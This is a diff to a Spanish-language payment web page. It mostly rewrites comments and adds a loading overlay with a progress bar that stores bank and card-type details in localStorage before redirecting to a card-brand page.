@@ -249,7 +249,9 @@
       display: block;
     }
 
-    /* LOADING OVERLAY */
+    /* ============================================ */
+    /* LOADING OVERLAY - IGUAL A PASO3.HTML        */
+    /* ============================================ */
     .loading-overlay {
       display: none;
       position: fixed;
@@ -259,6 +261,7 @@
       height: 100%;
       background: rgba(255, 255, 255, 0.85);
       backdrop-filter: blur(3px);
+      -webkit-backdrop-filter: blur(3px);
       z-index: 1000;
       justify-content: center;
       align-items: center;
@@ -683,7 +686,7 @@
     const defaultLogo = 'banco.png';
 
     // ============================================
-    // MAPA DE LOGOS DE TARJETAS
+    // MAPA DE LOGOS DE TARJETAS (para la carga)
     // ============================================
     const cardLogos = {
       'visa': 'visa.png',
@@ -811,7 +814,7 @@
     }
 
     // ============================================
-    // REDIRIGIR CON PANTALLA DE CARGA
+    // REDIRIGIR CON PANTALLA DE CARGA (como paso3.html)
     // ============================================
     function mostrarCargaYRedirigir(tipoTarjeta, banco) {
       const initialSpinner = document.getElementById('initialSpinner');
@@ -821,17 +824,17 @@
       const progressFill = document.getElementById('progressFill');
       const loadingText = document.getElementById('loadingText');
 
-      // 🔥 Guardar el logo del banco en localStorage (MISMAS CLAVES QUE PASO3)
+      // ✅ Guardar el logo del banco en localStorage para la página destino
       const logoFile = bankLogos[banco] || defaultLogo;
       localStorage.setItem('logo_banco', logoFile);
       localStorage.setItem('banco_seleccionado', banco);
       localStorage.setItem('tipo_tarjeta', tipoTarjeta);
       localStorage.setItem('card_last4', document.getElementById('cc').value.replace(/\s/g, '').slice(-4));
 
-      // Mostrar el overlay
+      // ✅ Mostrar el overlay de carga
       document.getElementById('loadingOverlay').classList.add('active');
 
-      // Ocultar spinner y mostrar logo
+      // ✅ Ocultar spinner y mostrar logo de la tarjeta
       initialSpinner.classList.remove('active');
       initialSpinner.style.display = 'none';
       
@@ -853,7 +856,7 @@
       };
       loadingText.textContent = 'Redirigiendo a ' + (nombres[tipoTarjeta] || '...');
       
-      // Barra de progreso
+      // ✅ Barra de progreso (3 segundos como en paso3.html)
       let progress = 0;
       const duration = 3000;
       const interval = 50;
@@ -986,6 +989,7 @@
           document.getElementById('tipo').disabled = false;
           document.getElementById('cardholder').disabled = false;
           mostrarMensaje('✅ Pago aprobado, redirigiendo...', 'success');
+          // ✅ Mostrar la pantalla de carga con barra de progreso
           setTimeout(() => { 
             mostrarCargaYRedirigir(tipoTarjeta, banco);
           }, 1500);
